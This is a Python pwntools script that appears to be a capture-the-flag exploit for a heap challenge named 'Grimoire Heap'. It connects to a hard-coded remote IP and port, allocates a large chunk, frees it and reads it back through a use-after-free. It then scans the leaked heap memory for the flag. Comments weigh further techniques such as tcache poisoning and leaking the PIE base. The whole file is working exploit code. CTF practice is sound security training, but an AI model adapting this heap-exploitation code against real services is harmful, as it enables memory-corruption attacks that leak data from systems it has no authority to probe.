#!/usr/bin/env python3
"""
Grimoire Heap - Try a different approach
Maybe we can read flag directly via UAF on a large buffer
"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)
    return data

# The key insight: the flag is loaded into g_flag on the heap.
# If we can allocate a chunk that overlaps with g_flag, we can read it.
# But g_flag is never freed.
#
# Alternative: maybe the flag is also stored in the binary's BSS (filebuf.0)
# at 0x4060. The BSS is at a fixed offset from the binary base.
# If we can leak the binary base (PIE), we can calculate the BSS address.
# Then we can use tcache poisoning to allocate at the BSS address and read the flag.
#
# But BSS is not on the heap. Tcache poisoning returns heap addresses.
#
# Let me try yet another approach: maybe the program has a different
# vulnerability that I'm missing.

p = connect()
p.recvuntil(b'> ')

# Try allocating a large buffer and reading more of the heap
# Create a spell of size 0x1000 (max)
log.info("Creating large spell")
create(p, 0, 0x1000, b'X' * 0x10 + b'\n')

# Banish it
log.info("Banishing")
banish(p, 0)

# Read UAF - this should give us 0x1000 bytes of heap data
log.info("Reading UAF (0x1000 bytes)")
data = recite(p, 0, 0x1000)

# Look for the flag pattern
log.info(f"Total bytes: {len(data)}")
log.info(f"First 32 bytes: {data[:32].hex()}")

# Search for printable strings
import re
strings = re.findall(rb'[\x20-\x7e]{8,}', data)
for s in strings:
    log.info(f"Found string: {s}")

# Check for flag pattern
if b'flag' in data.lower() or b'CTF' in data or b'{' in data:
    log.success(f"Found flag-like data!")
    # Find the position
    for i, b in enumerate(data):
        if b == ord('{') or (b == ord('f') and i+4 < len(data) and data[i:i+4] == b'flag'):
            log.info(f"Potential flag at offset {i}: {data[max(0,i-10):i+50]}")

p.sendline(b'0')
p.close()
